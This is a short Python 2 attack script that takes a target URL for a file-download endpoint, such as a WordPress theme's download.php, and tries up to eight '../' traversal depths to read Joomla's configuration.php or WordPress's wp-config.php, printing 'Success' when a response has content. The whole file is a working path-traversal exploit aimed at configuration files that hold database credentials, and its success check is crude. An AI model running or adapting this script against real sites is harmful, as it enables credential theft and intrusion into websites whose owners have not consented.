#!/usr/bin/python

import urllib

print ("Exmaple : http://site.com/wp-content/themes/nimblex/download.php?file=")

target = raw_input("Enter Address : ")
print ("""
Enter type :
1 = Joomla
2 = Wordpress
""")
i = 0
up="../"
typed=raw_input("Enter Type Attack :")
if (int(typed)==1):
    for i in range(8):
        r = urllib.urlopen(target + str(i * up) + "configuration.php")
        l = r.headers.items()
        for item, val in l:
            if str(item) == 'content-length':
                if (val > 0):
                    print r.url
                    print "Success"
                    break
elif(int(typed)==2):
    for i in range(8):
        r = urllib.urlopen(target + str(i * up) + "wp-config.php")
        l = r.headers.items()
        for item, val in l:
            if str(item) == 'content-length':
                if(val>0):
                    print r.url
                    print "Success"
                    break
else:
    print ("Enter 1-2 c_C")



